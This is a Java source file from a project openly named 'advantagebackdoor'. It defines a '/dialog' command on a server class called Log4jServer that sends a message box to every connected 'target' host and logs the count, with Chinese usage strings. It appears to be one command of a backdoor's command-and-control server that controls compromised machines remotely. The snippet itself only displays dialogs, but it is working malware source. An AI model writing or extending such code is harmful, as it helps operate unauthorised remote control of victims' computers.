package me.faintcloudy.advantagebackdoor.server.command;

import me.faintcloudy.advantagebackdoor.api.message.play.server.ShowDialogMessage;
import me.faintcloudy.advantagebackdoor.server.Log4jServer;
import me.faintcloudy.advantagebackdoor.api.connection.UserConnection;

public class CommandShowDialog extends ServerCommand {
    public CommandShowDialog() {
        super("/dialog", "向目标主机发送信息框");
    }

    @Override
    public void execute(String[] args) {
        if (args.length < 3)
        {
            Log4jServer.getInstance().getLogger().info("正确用法: /dialog <text> <title>");
            return;
        }

        ShowDialogMessage message = new ShowDialogMessage(args[1], args[2]);
        for (UserConnection target : Log4jServer.getInstance().getTargets()) {
            target.sendMessage(message);
        }

        Log4jServer.getInstance().getLogger().info("已向 " + Log4jServer.getInstance().getTargets().size() + " 个目标发送了信息框");
    }
}
